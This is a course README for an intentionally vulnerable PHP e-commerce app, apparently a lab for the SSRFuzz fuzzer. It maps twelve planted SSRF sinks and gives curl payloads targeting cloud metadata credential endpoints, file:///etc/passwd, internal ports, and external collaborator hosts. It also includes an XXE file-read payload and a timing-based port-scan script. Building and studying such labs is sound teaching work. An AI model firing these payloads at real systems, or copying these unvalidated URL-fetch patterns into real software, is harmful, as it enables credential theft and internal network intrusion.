# SSRF Vulnerabilities Map - SSRFuzzShop

Danh sách đầy đủ các lỗ hổng SSRF đã được thêm vào code để fuzzing với SSRFuzz.

## [Overview] Tổng quan

- **Tổng số lỗ hổng:** 12 SSRF sinks
- **Files bị ảnh hưởng:** 5 files
- **Dựa trên:** SSRFuzz Research (IEEE S&P 2024) - 86 PHP sinks

---

## [Vulnerability Details] Chi tiết các lỗ hổng

### 1. product.php

#### Vuln #1: Load External Image
- **Sink:** `file_get_contents()`
- **Endpoint:** `GET /product.php?id=1&load_image={URL}`
- **Mô tả:** Fetch image từ URL do user cung cấp, trả về binary content
- **Test payload:**
  ```
  ?id=1&load_image=http://169.254.169.254/latest/meta-data/
  ```

#### Vuln #2: Check Product API
- **Sink:** `curl_exec()`
- **Endpoint:** `GET /product.php?id=1&check_api={URL}`
- **Mô tả:** cURL request để kiểm tra API availability
- **Test payload:**
  ```
  ?id=1&check_api=http://localhost:8080/admin
  ```

---

### 2. profile.php

#### Vuln #3: Upload Avatar from URL
- **Sink:** `getimagesize()` + `file_get_contents()`
- **Endpoint:** `POST /profile.php` với param `avatar_url`
- **Mô tả:** Validate và fetch avatar từ external URL
- **Test payload:**
  ```bash
  curl -X POST http://localhost/profile.php \
    -d "avatar_url=http://metadata.google.internal/computeMetadata/v1/"
  ```

#### Vuln #4: Import Profile JSON
- **Sink:** `file_get_contents()` + `json_decode()`
- **Endpoint:** `POST /profile.php` với param `import_json`
- **Mô tả:** Import user profile data từ JSON URL
- **Test payload:**
  ```bash
  curl -X POST http://localhost/profile.php \
    -d "import_json=http://internal-api/user/data.json"
  ```

---

### 3. contact.php

#### Vuln #5: Attach File from URL
- **Sink:** `readfile()`
- **Endpoint:** `POST /contact.php` với param `attachment_url`
- **Mô tả:** Download và attach file từ URL, direct output
- **Test payload:**
  ```bash
  curl -X POST http://localhost/contact.php \
    -d "attachment_url=file:///etc/passwd"
  ```

#### Vuln #6: External Verification Service
- **Sink:** `file()`
- **Endpoint:** `POST /contact.php` với param `verify_captcha`
- **Mô tả:** Verify captcha/service qua external API, trả về array
- **Test payload:**
  ```bash
  curl -X POST http://localhost/contact.php \
    -d "name=Test&email=test@test.com&message=Hi&verify_captcha=http://captcha-api.internal/verify"
  ```

#### Vuln #7: Webhook Notification
- **Sink:** `curl_exec()` (POST)
- **Endpoint:** `POST /contact.php` với param `webhook`
- **Mô tả:** Silent webhook POST khi submit form
- **Test payload:**
  ```bash
  curl -X POST http://localhost/contact.php \
    -d "name=Test&email=test@test.com&message=Hi&webhook=http://webhook.site/xxx"
  ```

---

### 4. checkout.php

#### Vuln #8: Payment Gateway Verify
- **Sink:** `get_headers()`
- **Endpoint:** `GET /checkout.php?payment_verify={URL}`
- **Mô tả:** Lấy HTTP headers từ payment gateway
- **Test payload:**
  ```
  ?payment_verify=http://internal-payment-gateway:9200/_cluster/health
  ```

#### Vuln #9: Shipping Rate API
- **Sink:** `fsockopen()`
- **Endpoint:** `POST /checkout.php` với param `shipping_api`
- **Mô tả:** Socket connection để fetch shipping rates
- **Test payload:**
  ```bash
  curl -X POST http://localhost/checkout.php \
    -d "shipping_api=http://127.0.0.1:6379/"
  ```

#### Vuln #10: Order Webhook (Blind SSRF)
- **Sink:** `file_get_contents()` với stream_context (POST)
- **Endpoint:** `POST /checkout.php` với param `order_webhook`
- **Mô tả:** Silent POST notification khi order thành công
- **Test payload:**
  ```bash
  curl -X POST http://localhost/checkout.php \
    -d "name=Test&email=test@test.com&phone=123&address=HCM&order_webhook=http://burpcollaborator.net/notify"
  ```

---

### 5. admin_products.php

#### Vuln #11: Validate Image/XML
- **Sink:** `simplexml_load_file()` / `imagecreatefromstring()`
- **Endpoint:** `POST /admin_products.php` với param `validate_image`
- **Mô tả:** XXE nếu URL là .xml, hoặc image validation
- **Test payload (XXE):**
  ```bash
  curl -X POST http://localhost/admin_products.php \
    -d "validate_image=http://evil.com/xxe.xml"
  ```
- **Test payload (Image):**
  ```bash
  curl -X POST http://localhost/admin_products.php \
    -d "validate_image=http://internal-storage/secret.png"
  ```

#### Vuln #12: Import Products
- **Sink:** `file_get_contents()` + `json_decode()`
- **Endpoint:** `POST /admin_products.php` với param `import_url`
- **Mô tả:** Bulk import products từ JSON URL
- **Test payload:**
  ```bash
  curl -X POST http://localhost/admin_products.php \
    -d "import_url=http://localhost:8000/admin/export.json"
  ```

---

## [Testing Workflow] SSRFuzz Testing Workflow

### 1. Setup SSRFuzz Environment

```bash
# Clone SSRFuzz
git clone https://github.com/SSRFuzz/SSRFuzz.git /opt/SSRFuzz

# Install TaintInfer dependencies
cd /opt/SSRFuzz/TaintInfer
composer install

# Install Fuzzer dependencies
cd /opt/SSRFuzz/Fuzzer
pip install -r requirements.txt

# Compile zmark extension
cd /opt/SSRFuzz/zmark
phpize && ./configure && make
```

### 2. Configure PHP

Tạo `ssrfuzz.ini`:
```ini
[SSRFuzz]
auto_prepend_file=/opt/SSRFuzz/TaintInfer/src/Entry.php
extension=/opt/SSRFuzz/zmark/modules/zmark.so
zmark.enable=1
```

### 3. Setup Database

```sql
CREATE DATABASE ssrfuzz_test;
USE ssrfuzz_test;

-- Tạo các bảng theo hướng dẫn SSRFuzz
CREATE TABLE `ssrf_info` (...);
CREATE TABLE `ssrf_vuln` (...);
CREATE TABLE `check_info` (...);
```

### 4. Run Fuzzer

```bash
# Terminal 1: Start fuzzer
cd /opt/SSRFuzz/Fuzzer
python3 fuzzer.py

# Terminal 2: Start detector
python3 detector.py

# Terminal 3: Crawl target
curl "http://localhost/product.php?id=1"
curl "http://localhost/profile.php"
curl "http://localhost/contact.php"
curl "http://localhost/checkout.php"
curl "http://localhost/admin_products.php"
```

### 5. SSRFuzz sẽ tự động:

1. **Taint Tracking:** Mark các input parameters (id, load_image, avatar_url, etc.)
2. **Sink Detection:** Phát hiện khi tainted data đến 12 sinks đã implement
3. **Payload Generation:** Tạo SSRF payloads tự động:
   - `http://169.254.169.254/` (AWS metadata)
   - `http://localhost:port/` (port scanning)
   - `file:///etc/passwd` (local file)
   - `http://metadata.google.internal/` (GCP)
4. **Vulnerability Confirmation:** Detect qua timing, DNS logs, response analysis

---

## [Coverage Analysis] SSRF Sinks Coverage

Từ 86 sinks trong research SSRFuzz, project này implement:

| Sink Function | File | Status |
|--------------|------|--------|
| `file_get_contents()` | product.php, profile.php, admin_products.php, checkout.php | Implemented |
| `curl_exec()` | product.php, contact.php | Implemented |
| `getimagesize()` | profile.php | Implemented |
| `readfile()` | contact.php | Implemented |
| `file()` | contact.php | Implemented |
| `get_headers()` | checkout.php | Implemented |
| `fsockopen()` | checkout.php | Implemented |
| `simplexml_load_file()` | admin_products.php | Implemented |
| `imagecreatefromstring()` | admin_products.php | Implemented |
| Stream context (POST) | checkout.php | Implemented |

**Coverage:** 10/86 sinks (11.6%)

---

## [Test Cases] Recommended Test Cases

### Case 1: AWS Metadata SSRF
```bash
# Test trên product.php
curl "http://localhost/product.php?id=1&load_image=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### Case 2: Internal Port Scanning
```bash
# Test trên checkout.php với fsockopen
curl -X POST http://localhost/checkout.php \
  -d "shipping_api=http://127.0.0.1:22/"
```

### Case 3: XXE Attack
```bash
# Tạo file xxe.xml
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

# Host file
python3 -m http.server 8000 &

# Test XXE qua admin_products.php
curl -X POST http://localhost/admin_products.php \
  -d "validate_image=http://localhost:8000/xxe.xml"
```

### Case 4: Blind SSRF via DNS
```bash
# Sử dụng Burp Collaborator hoặc interact.sh
COLLAB_DOMAIN="xxx.burpcollaborator.net"

curl -X POST http://localhost/profile.php \
  -d "avatar_url=http://$COLLAB_DOMAIN/test.jpg"

# Check DNS logs tại Burp Collaborator
```

### Case 5: Local File Read
```bash
# Test với file:// wrapper
curl "http://localhost/product.php?id=1&load_image=file:///etc/passwd"
```

---

## [Detection Methods] Detection Tips

### 1. Out-of-Band (OOB) Detection
- Setup DNS logger: `dnslog.cn`, `interact.sh`, `Burp Collaborator`
- Webhook receiver: `webhook.site`, `requestbin.com`

### 2. Timing-based Detection
```python
import time
import requests

url = "http://localhost/checkout.php"

# Test với open port (fast)
start = time.time()
requests.post(url, data={"shipping_api": "http://127.0.0.1:80/"})
fast_time = time.time() - start

# Test với filtered port (slow/timeout)
start = time.time()
requests.post(url, data={"shipping_api": "http://127.0.0.1:81/"})
slow_time = time.time() - start

if slow_time > fast_time + 2:
    print("SSRF Detected via timing!")
```

### 3. Response Differentiation
- Compare response size/content giữa valid và invalid URLs
- Check HTTP status codes
- Analyze error messages

---

## [References] References

- **SSRFuzz Paper:** IEEE S&P 2024 - "Where URLs Become Weapons"
- **GitHub:** https://github.com/SSRFuzz/SSRFuzz
- **86 PHP Sinks:** https://github.com/SSRFuzz/SSRFSinks
- **TaintInfer Module:** https://github.com/SSRFuzz/TaintInfer
- **zmark Extension:** https://github.com/SSRFuzz/zmark

---

## [IMPORTANT] Disclaimer

**CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP VÀ NGHIÊN CỨU!**

Các lỗ hổng này được thêm vào cố ý để thực hành fuzzing. KHÔNG triển khai code này lên production hoặc môi trường internet công cộng.

---

**Generated for:** NT213 - Web & Application Security Course  
**Tool:** SSRFuzz (IEEE S&P 2024)  
**Date:** December 2025

